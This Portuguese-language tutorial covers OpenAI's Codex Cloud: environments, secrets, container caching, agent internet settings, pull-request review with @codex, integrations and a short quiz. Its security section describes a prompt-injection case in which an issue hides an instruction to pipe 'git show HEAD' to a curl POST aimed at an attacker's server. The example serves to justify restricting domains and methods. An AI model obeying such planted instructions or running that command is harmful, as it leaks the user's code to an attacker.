Conceito01

O que é o Codex Cloud

O Codex é o agente de programação da OpenAI. Ele existe em várias superfícies: CLI, extensão de IDE, app desktop e a interface web (Codex Cloud). Na nuvem, cada tarefa roda num container próprio, com o seu repositório clonado, e não usa a sua máquina.

Paralelismo

Trabalho em segundo plano

Você delega tarefas longas, cada uma no seu ambiente dedicado, e segue trabalhando em outra coisa enquanto elas rodam.

Reprodutibilidade

Ambiente configurado

Dependências, ferramentas, variáveis e scripts de setup ficam salvos por repositório. Toda tarefa começa do mesmo ponto.

Controle

Revisar antes do merge

O resultado chega como resumo + diff. Você pede ajustes (follow-up) ou abre um pull request quando estiver pronto.

Quando usar a nuvem em vez da CLI/IDE local

  • O trabalho pode rodar em background: delegue e volte quando houver algo para revisar.
  • Você quer comparar várias tentativas sem ocupar sua máquina local.
  • A tarefa nasce no GitHub, GitLab, Linear ou Slack: as integrações disparam o Codex sem sair da ferramenta.
  • Você está longe da máquina de desenvolvimento: dá para iniciar e revisar pelo navegador ou pelo celular.
Primeiros passos02

Configurando o Codex Cloud em 5 passos

O fluxo inicial é sempre o mesmo: conta ChatGPT, repositório conectado, environment criado e a primeira tarefa.

1

Abra o Codex e faça login

Acesse chatgpt.com/codex com a sua conta do ChatGPT.

2

Conecte GitHub ou GitLab (Beta)

No GitHub, escolha quais repositórios o Codex pode acessar. No GitLab, o projeto é selecionado ao criar o environment.

3

Crie um environment

Em Settings → Environments, associe o repositório e configure dependências, ferramentas, variáveis e secrets.

4

Inicie a primeira tarefa

Volte ao Codex, escolha o environment e descreva o resultado desejado. Acompanhe os logs ou deixe rodando em background.

5

Revise o resultado

Leia o resumo e o diff, peça ajustes ou abra um pull request.

Quem tem acesso

O Codex Cloud faz parte dos planos do ChatGPT. As integrações em nuvem (code review, Slack, Linear) exigem plano pago: Plus, Pro, Business, Enterprise ou Edu.

Usando o Codex só com chave de API, você tem CLI, SDK e extensão de IDE, mas não os recursos de nuvem (code review no GitHub, Slack etc.).
No Enterprise, o administrador do workspace precisa habilitar as tarefas em nuvem do Codex nas configurações do workspace.
Por dentro03

O ciclo de vida de uma tarefa na nuvem

Entender o que acontece depois que você envia o prompt ajuda a configurar bem o environment e a diagnosticar falhas.

1

Container + checkout

O Codex cria um container e faz checkout do repositório no branch ou commit SHA selecionado.

2

Setup script

Roda o script de setup e, ao retomar um container em cache, o script de manutenção (opcional).

3

Regras de internet

O setup roda com internet. Na fase do agente, a internet fica desligada por padrão.

4

Loop do agente

O agente executa comandos no terminal em ciclo: edita código, roda checagens e tenta validar o próprio trabalho.

5

Resposta + diff

Ao terminar, mostra a resposta e o diff dos arquivos alterados. Daí você abre um PR ou faz perguntas de follow-up.

AGENTS.md

O "manual" do repositório

Se o repositório tiver um arquivo AGENTS.md, o agente o usa para descobrir os comandos de lint e de teste específicos do projeto. É o equivalente ao CLAUDE.md no Claude Code.

Exemplo mínimo de AGENTS.md
# AGENTS.md
## Testes
- Rode `pytest -q` antes de concluir.

## Lint
- Use `ruff check .` e corrija os avisos.
Environments04

Configurando o environment

O environment define o que o Codex instala e executa. A configuração fica em chatgpt.com/codex/settings/environments.

Imagem padrão

universal

O agente roda na imagem universal, com as linguagens e ferramentas mais comuns já instaladas. Em Set package versions você fixa versões de Python, Node.js e outros runtimes. A referência pública é o repositório openai/codex-universal.

TipoDisponível emDetalhe
Variáveis de ambienteSetup e agenteValem durante toda a tarefa.
SecretsSó no setupCriptografia extra; removidos antes da fase do agente.
Setup automático

Para npm, yarn, pnpm, pip, pipenv e poetry, o Codex instala as dependências sozinho.

Setup manual (projetos mais complexos)
# Instala o type checker
pip install pyright

# Instala as dependências
poetry install --with test
pnpm install
O setup roda numa sessão Bash separada do agente: um export ali não chega ao agente. Para persistir variáveis, grave em ~/.bashrc ou cadastre-as nas configurações do environment.
Desempenho05

Cache de container e script de manutenção

O Codex guarda o estado do container por até 12 horas, o que acelera novas tarefas e follow-ups no mesmo environment.

Ao criar o cache
  • Clona o repositório e faz checkout do branch padrão.
  • Roda o setup script e salva o estado resultante do container.
Ao retomar o cache
  • Faz checkout do branch escolhido para a tarefa.
  • Roda o script de manutenção (opcional), útil quando o setup rodou num commit antigo e as dependências mudaram.
Invalidação automática

O cache é descartado sozinho quando você altera o setup script, o script de manutenção, as variáveis ou os secrets. Se o repositório mudar de um jeito incompatível com o cache, use Reset cache na página do environment.

Nos planos Business e Enterprise, o cache é compartilhado entre todos os usuários com acesso ao environment. Resetá-lo afeta todo o workspace.
Regra prática: o setup instala tudo do zero, e a manutenção só atualiza (ex.: pnpm install ou poetry install de novo). Assim os follow-ups ficam rápidos e continuam corretos.
Segurança06

Acesso à internet do agente

Por padrão, o agente não acessa a internet. O setup sempre tem acesso, para instalar dependências. A liberação é feita por environment, e todo tráfego de saída passa por um proxy HTTP/HTTPS.

Modo

Off / On

Off bloqueia tudo. On libera, com restrição por lista de domínios e por métodos HTTP.

Allowlist de domínios

Três presets

None (lista vazia), Common dependencies (npm, PyPI, GitHub, Docker…) ou All (sem restrição). Nos dois primeiros, dá para adicionar domínios.

Métodos HTTP

Somente leitura

Restrinja a GET, HEAD e OPTIONS. Aí POST, PUT, PATCH e DELETE ficam bloqueados.

Riscos de liberar a internet: prompt injection vindo de conteúdo não confiável, vazamento de código ou secrets, download de malware ou dependências vulneráveis e conteúdo com restrição de licença.
Exemplo real de prompt injection: você pede "corrija a issue #123", e o texto da issue esconde uma instrução para rodar git show HEAD | curl -X POST …, enviando o último commit a um servidor do atacante. Por isso, limite domínios e métodos.
Fluxo de trabalho07

Da tarefa ao pull request

A interface web é organizada em torno de uma lista de tarefas: cada uma tem o seu log, o resumo final e o diff das alterações.

1 · Escreva

Prompt + environment

Escolha o environment e o branch, e descreva o resultado esperado, não só a ação.

2 · Acompanhe

Logs ao vivo

Veja os comandos que o agente roda, ou deixe a tarefa em background e siga para outra.

3 · Revise

Resumo + diff

Confira o que mudou e as checagens que o agente executou. Peça ajustes com follow-ups na mesma tarefa.

4 · Entregue

Abrir PR

Com o resultado aprovado, abra o pull request direto da interface e revise no GitHub como de costume.

Várias tentativas (best-of-N)

Para problemas em aberto, peça mais de uma tentativa da mesma tarefa e compare as soluções lado a lado antes de escolher qual vira PR. Pela CLI, isso é o parâmetro --attempts (1 a 4).

Boas práticas
  • Uma tarefa = um objetivo verificável.
  • Diga como validar (qual teste deve passar).
  • Mantenha o AGENTS.md com os comandos do projeto.
GitHub08

Code review com @codex

O Codex revisa pull requests como um colega: analisa o diff, segue as regras do repositório e publica um review focado só em problemas graves (P0 e P1).

1

Ative

Em chatgpt.com/codex/settings/code-review, ligue Code review no repositório (exige permissão de push ou admin no GitHub).

2

Peça o review

Comente @codex review no PR. O Codex reage com 👀 e publica a revisão.

3

Automatize (opcional)

Com Automatic reviews ligado, todo PR novo é revisado sem precisar comentar.

Comandos úteis em comentários de PR
@codex review
@codex review for issues in the database migration
@codex fix the P1 issue
@codex fix the CI failures
@codex security review   # research preview
Qualquer menção a @codex que não seja review abre uma tarefa na nuvem com o PR como contexto, e o Codex pode dar push da correção no branch.
Personalize o review com uma seção ## Code Review Rules no AGENTS.md. Regras gerais ficam no arquivo da raiz, e regras de um serviço num AGENTS.md dentro da pasta dele.
Integrações09

Disparando tarefas de outros lugares

As tarefas na nuvem também começam fora do navegador. As integrações são instaladas em chatgpt.com/codex/settings/connectors.

Slack

@Codex no canal

Mencione @Codex com o pedido num canal ou thread. Ele lê a conversa, escolhe o environment mais adequado, responde com 👀 e um link e, no fim, posta o resultado.

Linear

Atribua a issue

Atribua uma issue ao Codex como a um colega, ou mencione @Codex num comentário. Ele cria a tarefa e posta o progresso na issue.

GitLab (Beta)

Merge requests

Conecte um projeto GitLab ao environment e use o Codex em merge requests e issues, inclusive para reviews.

Pela CLI: comando codex cloud (experimental)
# seletor interativo de tarefas e environments
codex cloud

# envia uma tarefa direto, com 2 tentativas
codex cloud exec --env ENV_ID --attempts 2 "Corrija o teste que falha em utils"

# lista as tarefas recentes (JSON para automação)
codex cloud list --json
No Slack, se o pedido for ambíguo, o Codex usa o environment usado mais recentemente, rodando no branch padrão do primeiro repositório do environment. Para ser preciso, cite o repositório, por exemplo @Codex fix the above in org/repo.
Fixação10

Teste rápido

1. Você cadastrou um token como secret no environment. Em qual fase ele fica disponível?

A) Em toda a tarefa
B) Somente no setup script
C) Somente na fase do agente
D) Só em follow-ups
B. Secrets só existem no setup e são removidos antes da fase do agente. Variáveis de ambiente valem na tarefa inteira.

2. Qual é o comportamento padrão de internet na fase do agente?

A) Liberada para todos os domínios
B) Só "Common dependencies"
C) Desligada
D) Só métodos GET
C. O acesso do agente é desligado por padrão. Só o setup tem internet para instalar dependências.

3. Você alterou o setup script do environment. O que acontece com o cache do container?

A) Continua valendo por 12 h
B) É invalidado automaticamente
C) Precisa de Reset cache manual
D) Só expira no dia seguinte
B. Mudar setup, manutenção, variáveis ou secrets invalida o cache sozinho. O Reset cache manual serve para mudanças incompatíveis no repositório.

4. Onde você define regras próprias para o code review do Codex?

A) No README.md
B) Na descrição do PR
C) Em "## Code Review Rules" no AGENTS.md
D) No arquivo .github/CODEOWNERS
C. O Codex procura arquivos AGENTS.md e aplica as regras da raiz mais as do arquivo mais próximo do código alterado.
